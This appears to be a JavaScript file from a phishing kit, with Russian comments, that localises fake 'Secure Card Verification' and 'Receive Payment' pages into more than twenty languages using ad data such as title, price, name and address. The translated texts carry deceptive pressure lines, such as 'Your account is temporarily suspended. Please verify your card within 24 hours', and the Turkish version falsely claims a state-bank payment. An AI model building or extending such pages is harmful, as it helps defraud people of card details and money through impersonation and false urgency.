document.addEventListener("DOMContentLoaded", function () {
  // Получаем данные из `script`-тега
  const ad = window.adData || {};
  const selectedLanguage = ad.language || "en";

  // Объект с переводами
  const translations = {
    en: {
      language: "English",
      titleVerify: "Secure Card Verification",
      titleReceive: "Receive Payment",
      price: "Total",
      name: "Name",
      address: "Address",
      buttonVerify: "VERIFY",
      buttonReceive: "RECEIVE MONEY",
      footerVerify:
        "Your account is temporarily suspended. Please verify your card within 24 hours.",
      footerReceive:
        "By clicking 'RECEIVE MONEY', you agree to the terms and conditions of the User Agreement.",
    },
    es: {
      language: "Español",
      titleVerify: "Verificación Segura de Tarjeta",
      titleReceive: "Recibir Pago",
      price: "Total",
      name: "Nombre",
      address: "Dirección",
      buttonVerify: "VERIFICAR",
      buttonReceive: "RECIBIR DINERO",
      footerVerify:
        "Su cuenta está suspendida temporalmente. Verifique su tarjeta dentro de 24 horas.",
      footerReceive:
        "Al hacer clic en 'RECIBIR DINERO', acepta los términos y condiciones.",
    },
    
    nl: {
      language: "Nederlands",
      titleVerify: "Veilige Kaartverificatie",
      titleReceive: "Betaling Ontvangen",
      price: "Totaal",
      name: "Naam",
      address: "Adres",
      buttonVerify: "VERIFIEREN",
      buttonReceive: "GELD ONTVANGEN",
      footerVerify:
        "Uw account is tijdelijk opgeschort. Verifieer uw kaart binnen 24 uur.",
      footerReceive:
        "Door op 'GELD ONTVANGEN' te klikken, gaat u akkoord met de algemene voorwaarden.",
    },

    fr: {
      language: "Français",
      titleVerify: "Vérification sécurisée de la carte",
      titleReceive: "Recevoir le paiement",
      price: "Total",
      name: "Nom",
      address: "Adresse",
      buttonVerify: "VÉRIFIER",
      buttonReceive: "RECEVOIR DE L'ARGENT",
      footerVerify:
        "Votre compte est temporairement suspendu. Vérifiez votre carte sous 24 heures.",
      footerReceive:
        "En cliquant sur 'RECEVOIR DE L'ARGENT', vous acceptez les termes et conditions.",
    },
    de: {
      language: "Deutsch",
      titleVerify: "Sichere Kartenverifizierung",
      titleReceive: "Zahlung erhalten",
      price: "Gesamt",
      name: "Name",
      address: "Adresse",
      buttonVerify: "ÜBERPRÜFEN",
      buttonReceive: "GELD ERHALTEN",
      footerVerify:
        "Ihr Konto ist vorübergehend gesperrt. Bitte überprüfen Sie Ihre Karte innerhalb von 24 Stunden.",
      footerReceive:
        "Durch Klicken auf 'GELD ERHALTEN' stimmen Sie den Bedingungen zu.",
    },
    it: {
      language: "Italiano",
      titleVerify: "Verifica sicura della carta",
      titleReceive: "Ricevi pagamento",
      price: "Totale",
      name: "Nome",
      address: "Indirizzo",
      buttonVerify: "VERIFICA",
      buttonReceive: "RICEVI SOLDI",
      footerVerify:
        "Il tuo account è temporaneamente sospeso. Verifica la carta entro 24 ore.",
      footerReceive:
        "Facendo clic su 'RICEVI SOLDI', accetti i termini dell'accordo utente.",
    },
    pt: {
      language: "Português",
      titleVerify: "Verificação segura do cartão",
      titleReceive: "Receber pagamento",
      price: "Total",
      name: "Nome",
      address: "Endereço",
      buttonVerify: "VERIFICAR",
      buttonReceive: "RECEBER DINHEIRO",
      footerVerify:
        "Sua conta está temporariamente suspensa. Verifique seu cartão dentro de 24 horas.",
      footerReceive:
        "Ao clicar em 'RECEBER DINHEIRO', você concorda com os termos e condições do Acordo de Usuário.",
    },
    se: {
      language: "Svenska",
      titleVerify: "Säker kortverifiering",
      titleReceive: "Ta emot betalning",
      price: "Totalt",
      name: "Namn",
      address: "Adress",
      buttonVerify: "VERIFIERA",
      buttonReceive: "TA EMOT PENGAR",
      footerVerify:
        "Ditt konto är tillfälligt avstängt. Verifiera ditt kort inom 24 timmar.",
      footerReceive:
        "Genom att klicka på 'TA EMOT PENGAR' godkänner du användarvillkoren.",
    },
    no: {
      language: "Norsk",
      titleVerify: "Sikker kortbekreftelse",
      titleReceive: "Motta betaling",
      price: "Totalt",
      name: "Navn",
      address: "Adresse",
      buttonVerify: "BEKREFT",
      buttonReceive: "MOTTA PENGER",
      footerVerify:
        "Kontoen din er midlertidig suspendert. Bekreft kortet ditt innen 24 timer.",
      footerReceive:
        "Ved å klikke på 'MOTTA PENGER' godtar du vilkårene for brukeravtalen.",
    },
    dk: {
      language: "Dansk",
      titleVerify: "Sikker kortbekræftelse",
      titleReceive: "Modtag betaling",
      price: "Total",
      name: "Navn",
      address: "Adresse",
      buttonVerify: "BEKRÆFT",
      buttonReceive: "MODTAG PENGE",
      footerVerify:
        "Din konto er midlertidigt suspenderet. Bekræft dit kort inden for 24 timer.",
      footerReceive:
        "Ved at klikke på 'MODTAG PENGE' accepterer du brugeraftalen.",
    },

    ba: {
      language: "Bosanski",
      titleVerify: "Sigurna verifikacija kartice",
      titleReceive: "Primanje uplate",
      price: "Ukupno",
      name: "Ime",
      address: "Adresa",
      buttonVerify: "VERIFIKUJ",
      buttonReceive: "PRIMI NOVAC",
      footerVerify:
        "Vaš račun je privremeno suspendovan. Verifikujte svoju karticu u roku od 24 sata.",
      footerReceive:
        "Klikom na 'PRIMI NOVAC', prihvatate uslove korisničkog ugovora.",
    },

    bg: {
      language: "Български",
      titleVerify: "Сигурна проверка на картата",
      titleReceive: "Получаване на плащане",
      price: "Общо",
      name: "Име",
      address: "Адрес",
      buttonVerify: "ПРОВЕРИ",
      buttonReceive: "ПОЛУЧИ ПАРИ",
      footerVerify:
        "Вашият акаунт е временно спрян. Проверете картата си в рамките на 24 часа.",
      footerReceive:
        "С натискане на 'ПОЛУЧИ ПАРИ' приемате условията на потребителското споразумение.",
    },

    cs: {
      language: "Čeština",
      titleVerify: "Bezpečné ověření karty",
      titleReceive: "Přijmout platbu",
      price: "Celkem",
      name: "Jméno",
      address: "Adresa",
      buttonVerify: "OVĚŘIT",
      buttonReceive: "PŘIJMOUT PENÍZE",
      footerVerify:
        "Váš účet je dočasně pozastaven. Ověřte svou kartu do 24 hodin.",
      footerReceive:
        "Kliknutím na 'PŘIJMOUT PENÍZE' souhlasíte s podmínkami uživatelské smlouvy.",
    },

    est: {
      language: "Eesti",
      titleVerify: "Turvaline kaardi kontroll",
      titleReceive: "Makse vastuvõtmine",
      price: "Kokku",
      name: "Nimi",
      address: "Aadress",
      buttonVerify: "KONTROLLI",
      buttonReceive: "VÕTA RAHA VASTU",
      footerVerify:
        "Teie konto on ajutiselt peatatud. Kinnitage oma kaart 24 tunni jooksul.",
      footerReceive:
        "Klõpsates 'VÕTA RAHA VASTU', nõustute kasutajatingimustega.",
    },

    hu: {
      language: "Magyar",
      titleVerify: "Biztonságos kártyaellenőrzés",
      titleReceive: "Kifizetés fogadása",
      price: "Összesen",
      name: "Név",
      address: "Cím",
      buttonVerify: "ELLENŐRIZ",
      buttonReceive: "PÉNZT KAP",
      footerVerify:
        "Fiókja átmenetileg zárolva van. Igazolja a kártyáját 24 órán belül.",
      footerReceive:
        "A 'PÉNZT KAP' gombra kattintva elfogadja a felhasználási feltételeket.",
    },

    lt: {
      language: "Lietuvių",
      titleVerify: "Saugus kortelės patvirtinimas",
      titleReceive: "Gauti mokėjimą",
      price: "Viso",
      name: "Vardas",
      address: "Adresas",
      buttonVerify: "PATVIRTINTI",
      buttonReceive: "GAUTI PINIGUS",
      footerVerify:
        "Jūsų paskyra laikinai sustabdyta. Patvirtinkite savo kortelę per 24 valandas.",
      footerReceive:
        "Paspaudę 'GAUTI PINIGUS', sutinkate su vartotojo sutarties sąlygomis.",
    },

    lv: {
      language: "Latviešu",
      titleVerify: "Droša kartes pārbaude",
      titleReceive: "Saņemt maksājumu",
      price: "Kopā",
      name: "Vārds",
      address: "Adrese",
      buttonVerify: "PĀRBAUDĪT",
      buttonReceive: "SAŅEMT NAUDU",
      footerVerify:
        "Jūsu konts ir īslaicīgi apturēts. Pārbaudiet savu karti 24 stundu laikā.",
      footerReceive:
        "Noklikšķinot uz 'SAŅEMT NAUDU', jūs piekrītat lietotāja līguma noteikumiem.",
    },

    ro: {
      language: "Română",
      titleVerify: "Verificare sigură a cardului",
      titleReceive: "Primiți plata",
      price: "Total",
      name: "Nume",
      address: "Adresă",
      buttonVerify: "VERIFICĂ",
      buttonReceive: "PRIMEȘTE BANI",
      footerVerify:
        "Contul dvs. este suspendat temporar. Verificați cardul în termen de 24 de ore.",
      footerReceive:
        "Prin apăsarea 'PRIMEȘTE BANI', sunteți de acord cu termenii și condițiile acordului de utilizator.",
    },

    sk: {
      language: "Slovenčina",
      titleVerify: "Bezpečná verifikácia karty",
      titleReceive: "Prijmite platbu",
      price: "Celkom",
      name: "Meno",
      address: "Adresa",
      buttonVerify: "OVERIŤ",
      buttonReceive: "PRIJÍMAŤ PENIAZE",
      footerVerify:
        "Váš účet bol dočasne pozastavený. Overte si kartu do 24 hodín.",
      footerReceive:
        "Kliknutím na 'PRIJÍMAŤ PENIAZE' súhlasíte s podmienkami používateľskej zmluvy.",
    },

    hr: {
      language: "Hrvatski",
      titleVerify: "Sigurna provjera kartice",
      titleReceive: "Primanje uplate",
      price: "Ukupno",
      name: "Ime",
      address: "Adresa",
      buttonVerify: "PROVJERI",
      buttonReceive: "PRIMI NOVAC",
      footerVerify:
        "Vaš račun je privremeno obustavljen. Potvrdite svoju karticu u roku od 24 sata.",
      footerReceive:
        "Klikom na 'PRIMI NOVAC' prihvaćate uvjete korisničkog ugovora.",
    },

    be: {
      language: "Belgisch Nederlands/Français",
      titleVerify: "Veilige kaartverificatie",
      titleReceive: "Betaling ontvangen",
      price: "Totaal",
      name: "Naam",
      address: "Adres",
      buttonVerify: "VERIFIËREN",
      buttonReceive: "GELD ONTVANGEN",
      footerVerify:
        "Uw account is tijdelijk opgeschort. Verifieer uw kaart binnen 24 uur.",
      footerReceive:
        "Door op 'GELD ONTVANGEN' te klikken, gaat u akkoord met de voorwaarden.",
    },

    ch: {
      language: "Schweizerdeutsch/Français/Italiano",
      titleVerify: "Sichere Kartenprüfung",
      titleReceive: "Zahlung empfangen",
      price: "Gesamt",
      name: "Name",
      address: "Adresse",
      buttonVerify: "ÜBERPRÜFEN",
      buttonReceive: "GELD EMPFANGEN",
      footerVerify:
        "Ihr Konto wurde vorübergehend gesperrt. Bitte überprüfen Sie Ihre Karte innerhalb von 24 Stunden.",
      footerReceive:
        "Durch Klicken auf 'GELD EMPFANGEN' stimmen Sie den Bedingungen zu.",
    },

    tr: {
      language: "Türkçe",
      titleVerify: "Güvenli Kart Doğrulama",
      titleReceive: "Ödeme, devlet bankasının katkısıyla sağlanmıştır",
      price: "Devlet ödemesi",
      name: "İsim",
      address: "Adres",
      buttonVerify: "DOĞRULA",
      buttonReceive: "ÖDEME ALMAK",
      footerVerify:
        "Hesabınız geçici olarak askıya alındı. Lütfen kartınızı 24 saat içinde doğrulayın.",
      footerReceive:
        "'ÖDEME ALMAK' butonuna tıklayarak Kullanıcı Sözleşmesi şartlarını kabul etmiş olursunuz.",
    },
    
  };

  // Выбираем нужный язык
  const lang = translations[selectedLanguage] || translations.en;

  // Перевод заголовка страницы
  document.title = `${ad.title} | ${
    ad.verif == true ? lang.titleVerify : lang.titleReceive
  }`;

  // Перевод основного заголовка <h1>
  const headerElement = document.querySelector("h1");
  if (headerElement) {
    headerElement.innerText =
      ad.verif == true ? lang.titleVerify : lang.titleReceive;
  }

  // Перевод кнопки
  const button = document.querySelector(".action-button");
  if (button) {
    button.innerText =
      ad.verif == true ? lang.buttonVerify : lang.buttonReceive;
  }

  // Перевод цены
  const priceElement = document.querySelector(".price");
  if (priceElement) {
    priceElement.innerHTML = `<strong>${lang.price}:</strong> ${
      ad.price || ""
    }`;
  }

  // Перевод имени и адреса
  const userInfoElement = document.querySelector(".user-info");
  if (userInfoElement) {
    let userInfoHTML = "";
    if (ad.name)
      userInfoHTML += `<p><strong>${lang.name}:</strong> ${ad.name}</p>`;
    if (ad.address)
      userInfoHTML += `<p><strong>${lang.address}:</strong> ${ad.address}</p>`;
    userInfoElement.innerHTML = userInfoHTML;
  }

  // Перевод подвала (footer)
  const footerText = document.querySelector(".footer p");
  if (footerText) {
    footerText.innerText =
      ad.verif == true ? lang.footerVerify : lang.footerReceive;
  }
});
